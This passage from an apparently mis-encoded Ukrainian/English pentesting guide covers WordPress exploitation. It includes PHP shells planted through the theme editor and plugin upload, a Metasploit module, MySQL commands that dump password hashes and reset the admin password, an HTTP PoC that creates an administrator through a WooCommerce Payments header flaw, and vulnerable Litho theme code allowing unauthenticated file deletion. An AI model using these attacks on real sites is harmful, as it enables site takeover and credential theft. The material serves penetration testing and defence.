**–ó–º—ñ–Ω–∞ php —É –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–Ω—ñ–π —Ç–µ–º—ñ (–ø–æ—Ç—Ä—ñ–±–Ω—ñ admin credentials)**

Appearance ‚Üí Theme Editor ‚Üí 404 Template (–ø—Ä–∞–≤–æ—Ä—É—á)

–ó–∞–º—ñ–Ω—ñ—Ç—å –≤–º—ñ—Å—Ç –Ω–∞ php shell:

![](<../../images/image (384).png>)

–ü–æ—à—É–∫–∞–π—Ç–µ –≤ —ñ–Ω—Ç–µ—Ä–Ω–µ—Ç—ñ, —è–∫ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –æ–Ω–æ–≤–ª–µ–Ω–æ—ó —Å—Ç–æ—Ä—ñ–Ω–∫–∏. –£ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É –ø–æ—Ç—Ä—ñ–±–Ω–æ –ø–µ—Ä–µ–π—Ç–∏ –∑–∞ –∞–¥—Ä–µ—Å–æ—é: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

–ú–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
—â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ —Å–µ—Å—ñ—é.

## Plugin RCE

### PHP plugin

It may be possible to upload .php files as a plugin.\
–°—Ç–≤–æ—Ä—ñ—Ç—å –≤–∞—à php backdoor, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥:

![](<../../images/image (183).png>)

–ü–æ—Ç—ñ–º –¥–æ–¥–∞–π—Ç–µ –Ω–æ–≤–∏–π plugin:

![](<../../images/image (722).png>)

–ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ plugin —Ç–∞ –Ω–∞—Ç–∏—Å–Ω—ñ—Ç—å Install Now:

![](<../../images/image (249).png>)

–ù–∞—Ç–∏—Å–Ω—ñ—Ç—å Procced:

![](<../../images/image (70).png>)

–ú–∞–±—É—Ç—å, —Ü–µ –Ω—ñ–±–∏—Ç–æ –Ω—ñ—á–æ–≥–æ –Ω–µ –∑—Ä–æ–±–∏—Ç—å, –∞–ª–µ —è–∫—â–æ –ø–µ—Ä–µ–π—Ç–∏ –≤ Media, –≤–∏ –ø–æ–±–∞—á–∏—Ç–µ –≤–∞—à shell, —â–æ –±—É–≤ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–∏–π:

![](<../../images/image (462).png>)

–í—ñ–¥–∫—Ä–∏–π—Ç–µ –π–æ–≥–æ —ñ –≤–∏ –ø–æ–±–∞—á–∏—Ç–µ URL –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è reverse shell:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

This method involves the installation of a malicious plugin known to be vulnerable and can be exploited to obtain a web shell. This process is carried out through the WordPress dashboard as follows:

1. **Plugin Acquisition**: The plugin is obtained from a source like Exploit DB like [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- –ü–µ—Ä–µ–π–¥—ñ—Ç—å —É WordPress dashboard, –ø–æ—Ç—ñ–º Dashboard > Plugins > Upload Plugin.
- –ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ zip-—Ñ–∞–π–ª –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–æ–≥–æ –ø–ª–∞–≥—ñ–Ω—É.
3. **Plugin Activation**: –ü—ñ—Å–ª—è —É—Å–ø—ñ—à–Ω–æ—ó —ñ–Ω—Å—Ç–∞–ª—è—Ü—ñ—ó –ø–ª–∞–≥—ñ–Ω –ø–æ—Ç—Ä—ñ–±–Ω–æ –∞–∫—Ç–∏–≤—É–≤–∞—Ç–∏ —á–µ—Ä–µ–∑ dashboard.
4. **Exploitation**:
- –Ø–∫—â–æ –ø–ª–∞–≥—ñ–Ω "reflex-gallery" –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–π —ñ –∞–∫—Ç–∏–≤–æ–≤–∞–Ω–∏–π, –π–æ–≥–æ –º–æ–∂–Ω–∞ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏, –æ—Å–∫—ñ–ª—å–∫–∏ –≤—ñ–Ω –≤—ñ–¥–æ–º–∏–π —è–∫ –≤—Ä–∞–∑–ª–∏–≤–∏–π.
- Metasploit framework –Ω–∞–¥–∞—î –µ–∫—Å–ø–ª–æ–π—Ç –¥–ª—è —Ü—ñ—î—ó –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ. –ó–∞–≤–∞–Ω—Ç–∞–∂–∏–≤—à–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–∏–π –º–æ–¥—É–ª—å —Ç–∞ –≤–∏–∫–æ–Ω–∞–≤—à–∏ –ø–æ—Ç—Ä—ñ–±–Ω—ñ –∫–æ–º–∞–Ω–¥–∏, –º–æ–∂–Ω–∞ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ meterpreter session, —â–æ –Ω–∞–¥–∞—î –Ω–µ—Å–∞–Ω–∫—Ü—ñ–æ–Ω–æ–≤–∞–Ω–∏–π –¥–æ—Å—Ç—É–ø –¥–æ —Å–∞–π—Ç—É.
- –í–∞—Ä—Ç–æ –∑–∞–∑–Ω–∞—á–∏—Ç–∏, —â–æ —Ü–µ –ª–∏—à–µ –æ–¥–∏–Ω —ñ–∑ –±–∞–≥–∞—Ç—å–æ—Ö –º–µ—Ç–æ–¥—ñ–≤ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó WordPress —Å–∞–π—Ç—É.

–ö–æ–Ω—Ç–µ–Ω—Ç –º—ñ—Å—Ç–∏—Ç—å —ñ–ª—é—Å—Ç—Ä–∞—Ü—ñ—ó, —â–æ –∑–æ–±—Ä–∞–∂—É—é—Ç—å –∫—Ä–æ–∫–∏ –≤ WordPress dashboard –¥–ª—è –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è —Ç–∞ –∞–∫—Ç–∏–≤–∞—Ü—ñ—ó –ø–ª–∞–≥—ñ–Ω—É. –û–¥–Ω–∞–∫ –≤–∞–∂–ª–∏–≤–æ –∑–∞–∑–Ω–∞—á–∏—Ç–∏, —â–æ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π —Ç–∞–∫–∏–º —á–∏–Ω–æ–º —î –Ω–µ–∑–∞–∫–æ–Ω–Ω–æ—é —Ç–∞ –Ω–µ–µ—Ç–∏—á–Ω–æ—é –±–µ–∑ –Ω–∞–ª–µ–∂–Ω–æ–≥–æ –¥–æ–∑–≤–æ–ª—É. –¶—é —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é —Å–ª—ñ–¥ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞–ª—å–Ω–æ —ñ —Ç—ñ–ª—å–∫–∏ –≤ –ª–µ–≥–∞–ª—å–Ω–æ–º—É –∫–æ–Ω—Ç–µ–∫—Å—Ç—ñ, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –ø—ñ–¥ —á–∞—Å penetration testing –∑ —è–≤–Ω–∏–º –¥–æ–∑–≤–æ–ª–æ–º.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ is a script designed to escalate a **Cross-Site Scripting (XSS)** vulnerability to **Remote Code Execution (RCE)** or other's criticals vulnerabilities in WordPress. For more info check [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). It provides **support for Wordpress Versions 6.X.X, 5.X.X and 4.X.X. and allows to:**
- _**Privilege Escalation:**_ –°—Ç–≤–æ—Ä—é—î –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —É WordPress.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ –ó–∞–≤–∞–Ω—Ç–∞–∂—É—î –≤–∞—à custom plugin (backdoor) —É WordPress.
- _**(RCE) Built-In Plugin Edit:**_ –†–µ–¥–∞–≥—É—î –≤–±—É–¥–æ–≤–∞–Ω—ñ –ø–ª–∞–≥—ñ–Ω–∏ —É WordPress.
- _**(RCE) Built-In Theme Edit:**_ –†–µ–¥–∞–≥—É—î –≤–±—É–¥–æ–≤–∞–Ω—ñ —Ç–µ–º–∏ —É WordPress.
- _**(Custom) Custom Exploits:**_ –ö–æ—Ä–∏—Å—Ç—É–≤–∞—Ü—å–∫—ñ –µ–∫—Å–ø–ª–æ–π—Ç–∏ –¥–ª—è —Å—Ç–æ—Ä–æ–Ω–Ω—ñ—Ö –ø–ª–∞–≥—ñ–Ω—ñ–≤/—Ç–µ–º WordPress.

## Post Exploitation

–í–∏—Ç—è–≥–Ω—É—Ç–∏ —ñ–º–µ–Ω–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —Ç–∞ –ø–∞—Ä–æ–ª—ñ:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
–ó–º—ñ–Ω–∏—Ç–∏ –ø–∞—Ä–æ–ª—å –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Attack Surface

–ó–Ω–∞–Ω–Ω—è —Ç–æ–≥–æ, —è–∫ Wordpress plugin –º–æ–∂–µ –µ–∫—Å–ø–æ–Ω—É–≤–∞—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω—ñ—Å—Ç—å, —î –∫–ª—é—á–æ–≤–∏–º –¥–ª—è –∑–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π —É —Ü—ñ–π —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω–æ—Å—Ç—ñ. –í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏, —è–∫ –ø–ª–∞–≥—ñ–Ω –º–æ–∂–µ –µ–∫—Å–ø–æ–Ω—É–≤–∞—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω—ñ—Å—Ç—å, —É –Ω–∞–≤–µ–¥–µ–Ω–∏—Ö –ø—É–Ω–∫—Ç–∞—Ö —Ç–∞ –ø–µ—Ä–µ–≥–ª—è–Ω—É—Ç–∏ –ø—Ä–∏–∫–ª–∞–¥–∏ –≤—Ä–∞–∑–ª–∏–≤–∏—Ö –ø–ª–∞–≥—ñ–Ω—ñ–≤ —É [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

–û–¥–∏–Ω –∑—ñ —Å–ø–æ—Å–æ–±—ñ–≤, —è–∫–∏–º Wordpress plugin –º–æ–∂–µ –≤–∏—Å—Ç–∞–≤–ª—è—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ—ó –¥–ª—è users ‚Äî —á–µ—Ä–µ–∑ AJAX handlers. –í–æ–Ω–∏ –º–æ–∂—É—Ç—å –º—ñ—Å—Ç–∏—Ç–∏ –ø–æ–º–∏–ª–∫–∏ –≤ –ª–æ–≥—ñ—Ü—ñ, authorization –∞–±–æ authentication. –ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, –¥–æ–≤–æ–ª—ñ frequently —Ü—ñ —Ñ—É–Ω–∫—Ü—ñ—ó –±—É–¥—É—Ç—å –±–∞–∑—É–≤–∞—Ç–∏ —ñ authentication, —ñ authorization –Ω–∞ –Ω–∞—è–≤–Ω–æ—Å—Ç—ñ wordpress nonce, —è–∫–∏–π **any user authenticated in the Wordpress instance might have** (–Ω–µ–∑–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ –π–æ–≥–æ role).

These are the functions that can be used to expose a function in a plugin:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**–í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è `nopriv` —Ä–æ–±–∏—Ç—å endpoint –¥–æ—Å—Ç—É–ø–Ω–∏–º –¥–ª—è –±—É–¥—å-—è–∫–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ (–Ω–∞–≤—ñ—Ç—å –Ω–µ–∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–∏—Ö).**

> [!CAUTION]
> –ö—Ä—ñ–º —Ç–æ–≥–æ, —è–∫—â–æ —Ñ—É–Ω–∫—Ü—ñ—è –ª–∏—à–µ –ø–µ—Ä–µ–≤—ñ—Ä—è—î –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—é –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ñ—É–Ω–∫—Ü—ñ—ó `wp_verify_nonce`, —Ü—è —Ñ—É–Ω–∫—Ü—ñ—è –ª–∏—à–µ –ø–µ—Ä–µ–≤—ñ—Ä—è—î, —â–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á —É–≤—ñ–π—à–æ–≤ —É —Å–∏—Å—Ç–µ–º—É ‚Äî –≤–æ–Ω–∞ –∑–∞–∑–≤–∏—á–∞–π –Ω–µ –ø–µ—Ä–µ–≤—ñ—Ä—è—î —Ä–æ–ª—å –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞. –¢–æ–º—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ –∑ –Ω–∏–∑—å–∫–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏ –º–æ–∂—É—Ç—å –º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –¥—ñ–π, —â–æ –≤–∏–º–∞–≥–∞—é—Ç—å –≤–∏—Å–æ–∫–∏—Ö –ø—Ä–∏–≤—ñ–ª–µ—ó–≤.

- **REST API**

–¢–∞–∫–æ–∂ –º–æ–∂–ª–∏–≤–æ –≤—ñ–¥–∫—Ä–∏–≤–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ —Ñ—É–Ω–∫—Ü—ñ–π wordpress, —Ä–µ—î—Å—Ç—Ä—É—é—á–∏ REST API –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ñ—É–Ω–∫—Ü—ñ—ó `register_rest_route`:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` ‚Äî —Ü–µ callback-—Ñ—É–Ω–∫—Ü—ñ—è, —è–∫–∞ –ø–µ—Ä–µ–≤—ñ—Ä—è—î, —á–∏ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–∏–π –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –¥–ª—è –≤–∏–∫–ª–∏–∫—É API-–º–µ—Ç–æ–¥—É.

**–Ø–∫—â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –≤–±—É–¥–æ–≤–∞–Ω–∞ —Ñ—É–Ω–∫—Ü—ñ—è `__return_true`, –≤–æ–Ω–∞ –ø—Ä–æ—Å—Ç–æ –ø—Ä–æ–ø—É—Å—Ç–∏—Ç—å –ø–µ—Ä–µ–≤—ñ—Ä–∫—É –ø—Ä–∞–≤ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞.**

- **Direct access to the php file**

–ó–≤—ñ—Å–Ω–æ, Wordpress –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î PHP, —ñ —Ñ–∞–π–ª–∏ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –ø–ª–∞–≥—ñ–Ω—ñ–≤ –¥–æ—Å—Ç—É–ø–Ω—ñ –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –∑ –≤–µ–±—É. –¢–æ–º—É, —è–∫—â–æ –ø–ª–∞–≥—ñ–Ω –≤—ñ–¥–∫—Ä–∏–≤–∞—î –≤—Ä–∞–∑–ª–∏–≤—É —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω—ñ—Å—Ç—å, —è–∫–∞ —Å–ø—Ä–∞—Ü—å–æ–≤—É—î –ª–∏—à–µ –ø—Ä–∏ –¥–æ—Å—Ç—É–ø—ñ –¥–æ —Ñ–∞–π–ª—É, —ó—ó –∑–º–æ–∂–µ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ –±—É–¥—å-—è–∫–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á.

### Trusted-header REST impersonation (WooCommerce Payments ‚â§ 5.6.1)

–î–µ—è–∫—ñ –ø–ª–∞–≥—ñ–Ω–∏ —Ä–µ–∞–ª—ñ–∑—É—é—Ç—å ¬´–¥–æ–≤—ñ—Ä–µ–Ω—ñ –∑–∞–≥–æ–ª–æ–≤–∫–∏¬ª —è–∫ —Å–∫–æ—Ä–æ—á–µ–Ω–Ω—è –¥–ª—è –≤–Ω—É—Ç—Ä—ñ—à–Ω—ñ—Ö —ñ–Ω—Ç–µ–≥—Ä–∞—Ü—ñ–π –∞–±–æ reverse proxies —ñ –ø–æ—Ç—ñ–º –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å —Ü–µ–π –∑–∞–≥–æ–ª–æ–≤–æ–∫, —â–æ–± –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –ø–æ—Ç–æ—á–Ω–∏–π –∫–æ–Ω—Ç–µ–∫—Å—Ç –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –¥–ª—è REST-–∑–∞–ø–∏—Ç—ñ–≤. –Ø–∫—â–æ –∑–∞–≥–æ–ª–æ–≤–æ–∫ –Ω–µ –ø–æ–≤'—è–∑–∞–Ω–∏–π –∫—Ä–∏–ø—Ç–æ–≥—Ä–∞—Ñ—ñ—á–Ω–æ –∑ –∑–∞–ø–∏—Ç–æ–º –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–æ–º upstream, –∞—Ç–∞–∫—É—é—á–∏–π –º–æ–∂–µ –ø—ñ–¥—Ä–æ–±–∏—Ç–∏ –π–æ–≥–æ —ñ –∑–≤–µ—Ä—Ç–∞—Ç–∏—Å—è –¥–æ –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏—Ö REST-–º–∞—Ä—à—Ä—É—Ç—ñ–≤ —è–∫ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä.

- Impact: –Ω–µ–∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–µ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –¥–æ admin —à–ª—è—Ö–æ–º —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –Ω–æ–≤–æ–≥–æ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞ —á–µ—Ä–µ–∑ –æ—Å–Ω–æ–≤–Ω–∏–π users REST-–º–∞—Ä—à—Ä—É—Ç.
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (–ø—Ä–∏–º—É—à—É—î user ID 1, –∑–∞–∑–≤–∏—á–∞–π –ø–µ—Ä—à–∏–π –∞–∫–∞—É–Ω—Ç –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞).
- Exploited route: `POST /wp-json/wp/v2/users` with an elevated role array.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
–ß–æ–º—É —Ü–µ –ø—Ä–∞—Ü—é—î

- –ü–ª–∞–≥—ñ–Ω –∑—ñ—Å—Ç–∞–≤–ª—è—î –∑–∞–≥–æ–ª–æ–≤–æ–∫, –∫–æ–Ω—Ç—Ä–æ–ª—å–æ–≤–∞–Ω–∏–π –∫–ª—ñ—î–Ω—Ç–æ–º, –∑—ñ —Å—Ç–∞–Ω–æ–º –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó —Ç–∞ –ø—Ä–æ–ø—É—Å–∫–∞—î –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ capability.
- WordPress core –æ—á—ñ–∫—É—î capability `create_users` –¥–ª—è —Ü—å–æ–≥–æ –º–∞—Ä—à—Ä—É—Ç—É; –µ–∫—Å–ø–ª–æ–π—Ç –ø–ª–∞–≥—ñ–Ω–∞ –æ–±—Ö–æ–¥–∏—Ç—å —Ü–µ, –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –≤—Å—Ç–∞–Ω–æ–≤–ª—é—é—á–∏ –∫–æ–Ω—Ç–µ–∫—Å—Ç –ø–æ—Ç–æ—á–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∑ –∑–∞–≥–æ–ª–æ–≤–∫–∞.

–û—á—ñ–∫—É–≤–∞–Ω—ñ —ñ–Ω–¥–∏–∫–∞—Ç–æ—Ä–∏ —É—Å–ø—ñ—Ö—É

- HTTP 201 –∑ JSON-—Ç—ñ–ª–æ–º, —â–æ –æ–ø–∏—Å—É—î —Å—Ç–≤–æ—Ä–µ–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞.
- –ù–æ–≤–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –∑ –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞, –≤–∏–¥–∏–º–∏–π —É `wp-admin/users.php`.

–ß–µ–∫–ª—ñ—Å—Ç –≤–∏—è–≤–ª–µ–Ω–Ω—è

- Grep –¥–ª—è `getallheaders()`, `$_SERVER['HTTP_...']` –∞–±–æ vendor SDKs, —è–∫—ñ —á–∏—Ç–∞—é—Ç—å –∫–∞—Å—Ç–æ–º–Ω—ñ –∑–∞–≥–æ–ª–æ–≤–∫–∏ –¥–ª—è –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –∫–æ–Ω—Ç–µ–∫—Å—Ç—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `wp_set_current_user()`, `wp_set_auth_cookie()`).
- –ü–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó REST –Ω–∞ –ø—Ä–µ–¥–º–µ—Ç –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏—Ö callback-—ñ–≤, —è–∫—ñ –Ω–µ –º–∞—é—Ç—å –Ω–∞–¥—ñ–π–Ω–∏—Ö –ø–µ—Ä–µ–≤—ñ—Ä–æ–∫ `permission_callback` —ñ –Ω–∞—Ç–æ–º—ñ—Å—Ç—å –ø–æ–∫–ª–∞–¥–∞—é—Ç—å—Å—è –Ω–∞ –∑–∞–≥–æ–ª–æ–≤–∫–∏ –∑–∞–ø–∏—Ç—É.
- –®—É–∫–∞–π—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –æ—Å–Ω–æ–≤–Ω–∏—Ö —Ñ—É–Ω–∫—Ü—ñ–π —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º–∏ (`wp_insert_user`, `wp_create_user`) –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ REST-–æ–±—Ä–æ–±–Ω–∏–∫—ñ–≤, –¥–æ—Å—Ç—É–ø–Ω—ñ –ª–∏—à–µ –∑–∞ –∑–Ω–∞—á–µ–Ω–Ω—è–º–∏ –∑–∞–≥–æ–ª–æ–≤–∫—ñ–≤.

### Unauthenticated Arbitrary File Deletion via wp_ajax_nopriv (Litho Theme <= 3.0)

–¢–µ–º–∏ —Ç–∞ –ø–ª–∞–≥—ñ–Ω–∏ WordPress —á–∞—Å—Ç–æ –≤—ñ–¥–∫—Ä–∏–≤–∞—é—Ç—å AJAX-–æ–±—Ä–æ–±–Ω–∏–∫–∏ —á–µ—Ä–µ–∑ —Ö—É–∫–∏ `wp_ajax_` —Ç–∞ `wp_ajax_nopriv_`. –ö–æ–ª–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –≤–∞—Ä—ñ–∞–Ω—Ç **_nopriv_** **callback —Å—Ç–∞—î –¥–æ—Å—Ç—É–ø–Ω–∏–º –¥–ª—è –Ω–µ–∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–∏—Ö –≤—ñ–¥–≤—ñ–¥—É–≤–∞—á—ñ–≤**, —Ç–æ–º—É –±—É–¥—å-—è–∫–∞ —á—É—Ç–ª–∏–≤–∞ –¥—ñ—è –ø–æ–≤–∏–Ω–Ω–∞ –¥–æ–¥–∞—Ç–∫–æ–≤–æ —Ä–µ–∞–ª—ñ–∑—É–≤–∞—Ç–∏:

1. –ü–µ—Ä–µ–≤—ñ—Ä–∫—É –ø—Ä–∞–≤ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `current_user_can()` –∞–±–æ –ø—Ä–∏–Ω–∞–π–º–Ω—ñ `is_user_logged_in()`), —Ç–∞
2. CSRF nonce, –≤–∞–ª—ñ–¥–∞—Ü—ñ—é —è–∫–æ–≥–æ –≤–∏–∫–æ–Ω—É—é—Ç—å `check_ajax_referer()` / `wp_verify_nonce()`, —Ç–∞
3. –°—Ç—Ä–æ–≥—É —Å–∞–Ω—ñ—Ç–∏–∑–∞—Ü—ñ—é / –≤–∞–ª—ñ–¥–∞—Ü—ñ—é –≤–≤–µ–¥–µ–Ω–∏—Ö –¥–∞–Ω–∏—Ö.

–ú—É–ª—å—Ç–∏—Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω–∞ —Ç–µ–º–∞ Litho (< 3.1) –ø—Ä–æ–ø—É—Å—Ç–∏–ª–∞ —Ü—ñ —Ç—Ä–∏ –∫–æ–Ω—Ç—Ä–æ–ª—ñ —É —Ñ—É–Ω–∫—Ü—ñ—ó *Remove Font Family* —ñ –≤ —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ñ –º—ñ—Å—Ç–∏–ª–∞ —Ç–∞–∫–∏–π –∫–æ–¥ (—Å–ø—Ä–æ—â–µ–Ω–æ):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Issues introduced by this snippet:

* **–ù–µ–∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–∏–π –¥–æ—Å—Ç—É–ø** ‚Äì –∑–∞—Ä–µ—î—Å—Ç—Ä–æ–≤–∞–Ω–æ —Ö—É–∫ `wp_ajax_nopriv_`.
* **No nonce / capability check** ‚Äì –±—É–¥—å-—è–∫–∏–π –≤—ñ–¥–≤—ñ–¥—É–≤–∞—á –º–æ–∂–µ –∑–≤–µ—Ä–Ω—É—Ç–∏—Å—è –¥–æ endpoint.
* **No path sanitisation** ‚Äì —Ä—è–¥–æ–∫, –∫–µ—Ä–æ–≤–∞–Ω–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º, `fontfamily` –∫–æ–Ω–∫–∞—Ç–µ–Ω—É—î—Ç—å—Å—è –∑ —Ñ–∞–π–ª–æ–≤–∏–º —à–ª—è—Ö–æ–º –±–µ–∑ —Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—ó, —â–æ –¥–æ–∑–≤–æ–ª—è—î –∫–ª–∞—Å–∏—á–Ω—É `../../` traversal.

#### –ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è

